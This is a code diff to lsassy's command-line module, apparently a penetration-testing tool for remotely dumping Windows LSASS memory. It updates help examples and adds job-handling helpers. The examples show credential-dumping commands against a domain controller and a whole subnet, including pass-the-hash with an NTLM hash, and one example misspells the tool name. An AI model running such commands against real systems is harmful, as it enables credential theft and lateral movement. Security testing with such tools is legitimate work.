@@ -17,25 +17,28 @@ version = pkg_resources.require("lsassy")[0].version
 
 def get_args():
     examples = '''examples:
+    ** Multiple hosts **
+    lsassy -d adsec.local -u pixis -p p4ssw0rd 192.168.1.0/24
     
     ** RunDLL Dump Method **
-    lsassy adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local
     
     ** Try all methods **
-    lsassy -m 0 adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local -m 0 
     
     ** Procdump Dump Method **
-    lsassy -m 2 -p /tmp/procdump.exe adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local -m 2 --procdump /tmp/procdump.exe
     
     ** dumpert Dump Method **
-    lsassy -m 5 -u /tmp/dumpert.exe adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local -m 5 --dumpert /tmp/dumpert.exe
     
-    ** Remote parsing only **
-    lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/pixis:p4ssw0rd@dc01.adsec.local
-    
+    ** Hash authentication **
+    sassy -d adsec.local -u pixis -H 7659B2FE69975DD2AF6F06EA73F6DF82 dc01.adsec.local
+         
     ** Output functions **
-    lsassy -j -q localuser@desktop01.adsec.local
-    lsassy -g --hashes 952c28bd2fd728898411b301475009b7 pixis@dc01.adsec.local'''
+    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local --format json
+    lsassy -d adsec.local -u pixis -p p4ssw0rd dc01.adsec.local -o /path/to/output/file.txt
+    '''
 
     parser = argparse.ArgumentParser(
         prog="lsassy",
@@ -150,3 +153,19 @@ def get_targets(targets):
         else:
             ret_targets += parse_targets(target)
     return [str(ip) for ip in ret_targets]
+
+
+def join_jobs(jobs):
+    for job in jobs:
+        try:
+            job.join()
+        except Exception as e:
+            pass
+
+
+def terminate_jobs(jobs):
+    for job in jobs:
+        try:
+            job.terminate()
+        except Exception as e:
+            pass
